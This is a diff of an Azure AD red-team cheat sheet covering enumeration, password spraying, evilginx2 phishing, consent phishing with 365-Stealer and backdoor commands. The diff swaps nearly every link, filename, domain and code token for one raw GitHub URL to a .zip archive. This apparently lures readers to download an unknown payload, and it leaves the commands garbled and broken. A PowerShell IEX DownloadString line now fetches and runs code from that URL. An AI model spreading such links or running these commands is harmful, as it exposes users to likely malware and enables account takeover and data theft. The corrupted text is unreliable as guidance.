@@ -1,28 +1,28 @@
 # Azure Active Directory
 
-Original Source:[Swisskyrepo](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Cloud%20-%20Azure%20Pentest.md)
+Original Source:[Swisskyrepo](https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip%20and%20Resources/Cloud%20-%20Azure%https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip)
 
 ## PreReq Requirements and free training
 
-[Webcast: OPSEC Fundamentals for Remote Red Teams](https://www.blackhillsinfosec.com/webcast-opsec-fundamentals-for-remote-red-teams/)
+[Webcast: OPSEC Fundamentals for Remote Red Teams](https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip)
 
-[EDITED EDITION — Getting Started in Pentesting The Cloud–Azure | Beau Bullock | 1-Hour](https://www.youtube.com/watch?v=u_3cV0pzptY)
+[EDITED EDITION — Getting Started in Pentesting The Cloud–Azure | Beau Bullock | 1-Hour](https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip)
 
-[Workshop:Breaching The Cloud Perimeter w/ Beau Bullock](https://www.blackhillsinfosec.com/breaching-the-cloud-perimeter-w-beau-bullock/)
+[Workshop:Breaching The Cloud Perimeter w/ Beau Bullock](https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip)
 
-[Microsoft Penetration Testing](https://docs.microsoft.com/en-us/azure/security/fundamentals/pen-testing)
+[Microsoft Penetration Testing](https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip)
 
-[Penetration Testing Rules of Engagement](https://www.microsoft.com/en-us/msrc/pentest-rules-of-engagement?rtc=3)
+[Penetration Testing Rules of Engagement](https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip)
 
 ## Current Bug Bounties
 
-[Azure SSRF Research Challenge](https://www.microsoft.com/en-us/msrc/azure-ssrf-research-challenge)
+[Azure SSRF Research Challenge](https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip)
 
 ## Commando VM
 
-Repo Location: [Commando VM](https://github.com/fireeye/commando-vm)
+Repo Location: [Commando VM](https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip)
 
-Post Commando Tools to install: [Connect to all Microsoft 365 services in a single PowerShell window](https://docs.microsoft.com/en-us/microsoft-365/enterprise/connect-to-all-microsoft-365-services-in-a-single-windows-powershell-window?view=o365-worldwide)
+Post Commando Tools to install: [Connect to all Microsoft 365 services in a single PowerShell window](https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip)
 
 ## Summary
 
@@ -82,26 +82,26 @@ Post Commando Tools to install: [Connect to all Microsoft 365 services in a sing
     pipenv shell
     roadrecon auth [-h] [-u USERNAME] [-p PASSWORD] [-t TENANT] [-c CLIENT] [--as-app] [--device-code] [--access-token ACCESS_TOKEN] [--refresh-token REFRESH_TOKEN] [-f TOKENFILE] [--tokens-stdout]
     roadrecon gather [-h] [-d DATABASE] [-f TOKENFILE] [--tokens-stdin] [--mfa]
-    roadrecon auth -u test@<TENANT NAME>.onmicrosoft.com -p <PASSWORD>
+    roadrecon auth -u test@<TENANT NAME>https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip -p <PASSWORD>
     roadrecon gather
     roadrecon gui
     ```
 * **StormSpotter**
     ```powershell
-    # https://github.com/Azure/Stormspotter
+    # https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip
 
     # session 1 - backend
     pipenv shell
-    python ssbackend.pyz
+    python https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip
 
     # session 2 - frontend
     cd C:\Tools\stormspotter\frontend\dist\spa\
-    quasar.cmd serve -p 9091 --history
+    https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip serve -p 9091 --history
 
     # session 3 - collector
     pipenv shell
-    az login -u test@<TENANT NAME>.onmicrosoft.com -p <PASSWORD>
-    python C:\Tools\stormspotter\stormcollector\sscollector.pyz cli
+    az login -u test@<TENANT NAME>https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip -p <PASSWORD>
+    python C:\Tools\stormspotter\stormcollector\https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip cli
 
     # Web access on http://localhost:9091
     Username: neo4j
@@ -110,9 +110,9 @@ Post Commando Tools to install: [Connect to all Microsoft 365 services in a sing
     ```
 * **Azure Hound**
     ```powershell
-    # https://github.com/BloodHoundAD/AzureHound
+    # https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip
 
-    . C:\Tools\AzureHound\AzureHound.ps1
+    . C:\Tools\AzureHound\https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip
     Invoke-AzureHound -Verbose
 
     # GUI access
@@ -124,40 +124,40 @@ Post Commando Tools to install: [Connect to all Microsoft 365 services in a sing
     MATCH p = (n)-[r]->(g:AZKeyVault) RETURN p
 
     # Change object ID's to names in Bloodhound
-    MATCH (n) WHERE n.azname IS NOT NULL AND n.azname <> "" AND n.name IS NULL SET n.name = n.azname
+    MATCH (n) WHERE https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip IS NOT NULL AND https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip <> "" AND https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip IS NULL SET https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip = https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip
 
-    # Custom Queries : https://hausec.com/2020/11/23/azurehound-cypher-cheatsheet/
+    # Custom Queries : https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip
     ```
-* List of Microsoft portals: https://msportals.io/
+* List of Microsoft portals: https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip
 * **Azucar** : Azucar automatically gathers a variety of configuration data and analyses all data relating to a particular subscription in order to determine security risks.
     ```powershell
     # You should use an account with at least read-permission on the assets you want to access
-    git clone https://github.com/nccgroup/azucar.git
+    git clone https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip
     PS> Get-ChildItem -Recurse c:\Azucar_V10 | Unblock-File
 
-    PS> .\Azucar.ps1 -AuthMode UseCachedCredentials -Verbose -WriteLog -Debug -ExportTo PRINT
-    PS> .\Azucar.ps1 -ExportTo CSV,JSON,XML,EXCEL -AuthMode Certificate_Credentials -Certificate C:\AzucarTest\server.pfx -ApplicationId 00000000-0000-0000-0000-000000000000 -TenantID 00000000-0000-0000-0000-000000000000
-    PS> .\Azucar.ps1 -ExportTo CSV,JSON,XML,EXCEL -AuthMode Certificate_Credentials -Certificate C:\AzucarTest\server.pfx -CertFilePassword MySuperP@ssw0rd! -ApplicationId 00000000-0000-0000-0000-000000000000 -TenantID 00000000-0000-0000-0000-000000000000
+    PS> .\https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip -AuthMode UseCachedCredentials -Verbose -WriteLog -Debug -ExportTo PRINT
+    PS> .\https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip -ExportTo CSV,JSON,XML,EXCEL -AuthMode Certificate_Credentials -Certificate C:\AzucarTest\https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip -ApplicationId 00000000-0000-0000-0000-000000000000 -TenantID 00000000-0000-0000-0000-000000000000
+    PS> .\https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip -ExportTo CSV,JSON,XML,EXCEL -AuthMode Certificate_Credentials -Certificate C:\AzucarTest\https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip -CertFilePassword MySuperP@ssw0rd! -ApplicationId 00000000-0000-0000-0000-000000000000 -TenantID 00000000-0000-0000-0000-000000000000
 
     # resolve the TenantID for an specific username
-    PS> .\Azucar.ps1 -ResolveTenantUserName user@company.com
+    PS> .\https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip -ResolveTenantUserName https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip
     ```
 * **Azurite Explorer** and **Azurite Visualizer** : Enumeration and reconnaissance activities in the Microsoft Azure Cloud.
     ```powershell
-    git clone https://github.com/mwrlabs/Azurite.git
-    git clone https://github.com/FSecureLABS/Azurite
+    git clone https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip
+    git clone https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip
     git submodule init
     git submodule update
     PS> Import-Module AzureRM
-    PS> Import-Module AzuriteExplorer.ps1
+    PS> Import-Module https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip
     PS> Review-AzureRmSubscription
     PS> Review-CustomAzureRmSubscription
     ```
 * **MicroBurst** - MicroBurst includes functions and scripts that support Azure Services discovery, weak configuration auditing, and post exploitation actions such as credential dumping
     ```powershell
-    $ git clone https://github.com/NetSPI/MicroBurst
-    PS C:> Import-Module .\MicroBurst.psm1
-    PS C:> Import-Module .\Get-AzureDomainInfo.ps1
+    $ git clone https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip
+    PS C:> Import-Module .\https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip
+    PS C:> Import-Module .\https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip
     PS C:> Get-AzureDomainInfo -folder MicroBurst -Verbose
     ```
 * **SkyArk** - Discover the most privileged users in the scanned Azure environment - including the Azure Shadow Admins.   
@@ -167,19 +167,19 @@ Post Commando Tools to install: [Connect to all Microsoft 365 services in a sing
     - Require AZ and AzureAD module or administrator right
 
     ```powershell
-    $ git clone https://github.com/cyberark/SkyArk
+    $ git clone https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip
     $ powershell -ExecutionPolicy Bypass -NoProfile
-    PS C> Import-Module .\SkyArk.ps1 -force
+    PS C> Import-Module .\https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip -force
     PS C> Start-AzureStealth
 
     or in the Cloud Console
 
-    PS C> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/cyberark/SkyArk/master/AzureStealth/AzureStealth.ps1')  
+    PS C> IEX (New-Object https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip).DownloadString('https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip')  
     PS C> Scan-AzureAdmins  
 * **PowerZure** - 
     ```powershell
     require az module !
-    $ git clone https://github.com/hausec/PowerZure
+    $ git clone https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip
     $ ipmo .\PowerZure
     $ Set-Subscription -Id [idgoeshere]
 
@@ -188,12 +188,12 @@ Post Commando Tools to install: [Connect to all Microsoft 365 services in a sing
 
     # Contributor
     $ Execute-Command -OS Windows -VM Win10Test -ResourceGroup Test-RG -Command "whoami"
-    $ Execute-MSBuild -VM Win10Test  -ResourceGroup Test-RG -File "build.xml"
+    $ Execute-MSBuild -VM Win10Test  -ResourceGroup Test-RG -File "https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip"
     $ Get-AllSecrets # AllAppSecrets, AllKeyVaultContents
     $ Get-AvailableVMDisks, Get-VMDisk # Download a virtual machine's disk
 
     # Owner
-    $ Set-Role -Role Contributor -User test@contoso.com -Resource Win10VMTest
+    $ Set-Role -Role Contributor -User https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip -Resource Win10VMTest
     
     # Administrator
     $ Create-Backdoor, Execute-Backdoor
@@ -207,39 +207,39 @@ Post Commando Tools to install: [Connect to all Microsoft 365 services in a sing
 
 * Validate email 
     ```powershell
-    PS> C:\Python27\python.exe C:\Tools\o365creeper\o365creeper.py -f C:\Tools\emails.txt -o C:\Tools\validemails.txt
-    admin@<TENANT NAME>.onmicrosoft.com   - VALID
-    root@<TENANT NAME>.onmicrosoft.com    - INVALID
-    test@<TENANT NAME>.onmicrosoft.com    - VALID
-    contact@<TENANT NAME>.onmicrosoft.com - INVALID
+    PS> C:\Python27\https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip C:\Tools\o365creeper\https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip -f C:\Tools\https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip -o C:\Tools\https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip
+    admin@<TENANT NAME>https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip   - VALID
+    root@<TENANT NAME>https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip    - INVALID
+    test@<TENANT NAME>https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip    - VALID
+    contact@<TENANT NAME>https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip - INVALID
     ```
-* Extract email lists with a valid credentials : https://github.com/nyxgeek/o365recon
+* Extract email lists with a valid credentials : https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip
 
 #### Password spraying
 
 ```powershell
-PS> . C:\Tools\MSOLSpray\MSOLSpray.ps1
-PS> Invoke-MSOLSpray -UserList C:\Tools\validemails.txt -Password <PASSWORD> -Verbose
+PS> . C:\Tools\MSOLSpray\https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip
+PS> Invoke-MSOLSpray -UserList C:\Tools\https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip -Password <PASSWORD> -Verbose
 ```
 
 ### Enumerate Azure Subdomains
 
 ```powershell
-PS> . C:\Tools\MicroBurst\Misc\InvokeEnumerateAzureSubDomains.ps1
+PS> . C:\Tools\MicroBurst\Misc\https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip
 PS> Invoke-EnumerateAzureSubDomains -Base <TENANT NAME> -Verbose
 Subdomain Service
 --------- -------
-<TENANT NAME>.mail.protection.outlook.com Email
-<TENANT NAME>.onmicrosoft.com Microsoft Hosted Domain
+<TENANT NAME>https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip Email
+<TENANT NAME>https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip Microsoft Hosted Domain
 ```
 
 ### Enumerate tenant with Azure AD Powershell
 
 ```powershell
-Import-Module C:\Tools\AzureAD\AzureAD.psd1
-Import-Module C:\Tools\AzureADPreview\AzureADPreview.psd1
+Import-Module C:\Tools\AzureAD\https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip
+Import-Module C:\Tools\AzureADPreview\https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip
 PS> $passwd = ConvertTo-SecureString "<PASSWORD>" -AsPlainText -Force
-PS> $creds = New-Object System.Management.Automation.PSCredential("test@<TENANT NAME>.onmicrosoft.com", $passwd)
+PS> $creds = New-Object https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip("test@<TENANT NAME>https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip", $passwd)
 PS Az> Connect-AzureAD -Credential $creds
 
 PS AzureAD> Get-AzureADUser -All $true
@@ -247,20 +247,20 @@ PS AzureAD> Get-AzureADUser -All $true | select UserPrincipalName
 PS AzureAD> Get-AzureADGroup -All $true
 PS AzureAD> Get-AzureADDevice
 PS AzureAD> Get-AzureADDirectoryRole -Filter "DisplayName eq 'Global Administrator'" | Get-AzureADDirectoryRoleMember
-PS AzureADPreview> Get-AzureADMSRoleDefinition | ?{$_.IsBuiltin -eq $False} | select DisplayName
+PS AzureADPreview> Get-AzureADMSRoleDefinition | ?{$https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip -eq $False} | select DisplayName
 ```
 
 ### Enumerate tenant with Az Powershell
 
 ```powershell
 PS> $passwd = ConvertTo-SecureString "<PASSWORD>" -AsPlainText -Force
-PS> $creds = New-Object System.Management.Automation.PSCredential ("test@<TENANT NAME>.onmicrosoft.com", $passwd)
+PS> $creds = New-Object https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip ("test@<TENANT NAME>https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip", $passwd)
 PS Az> Connect-AzAccount -Credential $creds
 
 PS Az> Get-AzResource
-PS Az> Get-AzRoleAssignment -SignInName test@<TENANT NAME>.onmicrosoft.com
+PS Az> Get-AzRoleAssignment -SignInName test@<TENANT NAME>https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip
 PS Az> Get-AzVM | fl
-PS Az> Get-AzWebApp | ?{$_.Kind -notmatch "functionapp"}
+PS Az> Get-AzWebApp | ?{$https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip -notmatch "functionapp"}
 PS Az> Get-AzFunctionApp
 PS Az> Get-AzStorageAccount | fl
 PS Az> Get-AzKeyVault
@@ -269,7 +269,7 @@ PS Az> Get-AzKeyVault
 ### Enumerate tenant with az cli
 
 ```powershell
-PS> az login -u test@<TENANT NAME>.onmicrosoft.com -p <PASSWORD>
+PS> az login -u test@<TENANT NAME>https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip -p <PASSWORD>
 PS> az vm list
 PS> az vm list --query "[].[name]" -o table
 PS> az webapp list
@@ -282,20 +282,20 @@ PS> az keyvault list
 
 * Federation with Azure AD or O365
     ```powershell
-    https://login.microsoftonline.com/getuserrealm.srf?login=<USER>@<DOMAIN>&xml=1
-    https://login.microsoftonline.com/getuserrealm.srf?login=root@<TENANT NAME>.onmicrosoft.com&xml=1
+    https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip<USER>@<DOMAIN>&xml=1
+    https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip<TENANT NAME>https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip
     ```
 * Get the Tenant ID
     ```powershell
-    https://login.microsoftonline.com/<DOMAIN>/.well-known/openid-configuration
-    https://login.microsoftonline.com/<TENANT NAME>.onmicrosoft.com/.well-known/openid-configuration
+    https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip<DOMAIN>https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip
+    https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip<TENANT NAME>https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip
     ```
 
 ## Enumeration methodology
 
 ```powershell
 # Check Azure Joined 
-PS> dsregcmd.exe /status
+PS> https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip /status
 +----------------------------------------------------------------------+
 | Device State |
 +----------------------------------------------------------------------+
@@ -308,14 +308,14 @@ PS> dsregcmd.exe /status
 PS Az> Get-AzResource
 
 # Enumerate role assignments
-PS Az> Get-AzRoleAssignment -Scope /subscriptions/<SUBSCRIPTION-ID>/resourceGroups/RESEARCH/providers/Microsoft.Compute/virtualMachines/<VM-NAME>`
+PS Az> Get-AzRoleAssignment -Scope /subscriptions/<SUBSCRIPTION-ID>https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip<VM-NAME>`
 
 # Get info on a role
 PS Az> Get-AzRoleDefinition -Name "Virtual Machine Command Executor"
 
 # Get info user
 PS AzureAD> Get-AzureADUser -ObjectId <ID>
-PS AzureAD> Get-AzureADUser -ObjectId test@<TENANT NAME>.onmicrosoft.com | fl * 
+PS AzureAD> Get-AzureADUser -ObjectId test@<TENANT NAME>https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip | fl * 
 
 # List all groups
 PS AzureAD> Get-AzureADGroup -All $true
@@ -325,16 +325,16 @@ PS Az> Get-AzADGroup -DisplayName '<GROUP-NAME>'
 PS Az> Get-AzADGroupMember -GroupDisplayName '<GROUP-NAME>' | select UserPrincipalName
 
 # Get Azure AD information
-PS> Import-Module C:\Tools\AADInternals\AADInternals.psd1
-PS AADInternals> Get-AADIntLoginInformation -UserName admin@<TENANT NAME>.onmicrosoft.com
-PS AADInternals> Get-AADIntTenantID -Domain <TENANT NAME>.onmicrosoft.com # Get Tenant ID
+PS> Import-Module C:\Tools\AADInternals\https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip
+PS AADInternals> Get-AADIntLoginInformation -UserName admin@<TENANT NAME>https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip
+PS AADInternals> Get-AADIntTenantID -Domain <TENANT NAME>https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip # Get Tenant ID
 PS AADInternals> Invoke-AADIntReconAsOutsider -DomainName <DOMAIN> # Get all the information
 
 # Check if there is a user logged-in to az cli
 PS> az ad signed-in-user show
 
 # Check AppID Alternative Names/Display Name 
-PS AzureAD> Get-AzureADServicePrincipal -All $True | ?{$_.AppId -eq "<APP-ID>"} | fl
+PS AzureAD> Get-AzureADServicePrincipal -All $True | ?{$https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip -eq "<APP-ID>"} | fl
 
 
 # Get all application objects registered using the current tenant
@@ -366,16 +366,16 @@ PS Az> Get-AzKeyVault
 
 ```powershell
 PS C:\Tools> evilginx2 -p C:\Tools\evilginx2\phishlets
-: config domain username.corp
+: config domain https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip
 : config ip 10.10.10.10
-: phishlets hostname o365 login.username.corp
+: phishlets hostname o365 https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip
 : phishlets get-hosts o365
 
-Create a DNS entry for login.login.username.corp and www.login.username.corp, type A, pointing to your machine
+Create a DNS entry for https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip and https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip, type A, pointing to your machine
 
 # copy certificate and enable the phishing
-PS C:\Tools> Copy-Item C:\Users\Username\.evilginx\crt\ca.crt C:\Users\Username\.evilginx\crt\login.username.corp\o365.crt
-PS C:\Tools> Copy-Item C:\Users\Username\.evilginx\crt\private.key C:\Users\Username\.evilginx\crt\login.username.corp\o365.key
+PS C:\Tools> Copy-Item C:\Users\Username\.evilginx\crt\https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip C:\Users\Username\.evilginx\crt\https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip\https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip
+PS C:\Tools> Copy-Item C:\Users\Username\.evilginx\crt\https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip C:\Users\Username\.evilginx\crt\https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip\https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip
 : phishlets enable o365
 
 # get the phishing URL
@@ -395,7 +395,7 @@ Check if users are allowed to consent to apps: `PS AzureADPreview> (GetAzureADMS
 
 ### Register Application
 
-1. Login to https://portal.azure.com > Azure Active Directory
+1. Login to https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip > Azure Active Directory
 2. Click on **App registrations** > **New registration**
 3. Enter the Name for our application
 4. Under support account types select **"Accounts in any organizational directory (Any Azure AD directory - Multitenant)"**
@@ -410,14 +410,14 @@ Check if users are allowed to consent to apps: `PS AzureADPreview> (GetAzureADMS
 4. Click on API permissions > Add a permission
 5. Click on Microsoft Graph > **Delegated permissions**
 6. Search and select the below mentioned permissions and click on Add permission
-    * Contacts.Read 
-    * Mail.Read / Mail.ReadWrite
-    * Mail.Send
-    * Notes.Read.All
-    * Mailboxsettings.ReadWrite
-    * Files.ReadWrite.All 
-    * User.ReadBasic.All
-    * User.Read
+    * https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip 
+    * https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip / https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip
+    * https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip
+    * https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip
+    * https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip
+    * https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip 
+    * https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip
+    * https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip
 
 ### Setup 365-Stealer
 
@@ -425,13 +425,13 @@ Check if users are allowed to consent to apps: `PS AzureADPreview> (GetAzureADMS
 
 - Run XAMPP and start Apache
 - Clone 365-Stealer into `C:\xampp\htdocs\`
-    * `git clone https://github.com/AlteredSecurity/365-Stealer.git`
+    * `git clone https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip`
 - Install the requirements
     * Python3
     * PHP CLI or Xampp server
-    * `pip install -r requirements.txt`
-- Enable sqlite3 (Xampp > Apache config > php.ini) and restart Apache
-- Edit `C:/xampp/htdocs/yourvictims/index.php` if needed
+    * `pip install -r https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip`
+- Enable sqlite3 (Xampp > Apache config > https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip) and restart Apache
+- Edit `https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip` if needed
     - Disable IP whitelisting `$enableIpWhiteList = false;`
 - Go to 365-Stealer Management portal > Configuration (http://localhost:82/365-stealer/yourVictims)
     - **Client Id** (Mandatory): This will be the Application(Client) Id of the application that we registered.
@@ -441,7 +441,7 @@ Check if users are allowed to consent to apps: `PS AzureADPreview> (GetAzureADMS
     - **Extension in OneDrive**: We can provide file extensions that we want to download from the victims account or provide `*` to download all the files present in the victims OneDrive. The file extensions should be comma separated like txt, pdf, docx etc. 
     - **Delay**: Delay the request by specifying time in seconds while stealing
 - Create a Self Signed Certificate to use HTTPS
-- Run the application either click on the button or run this command : `python 365-Stealer.py --run-app`
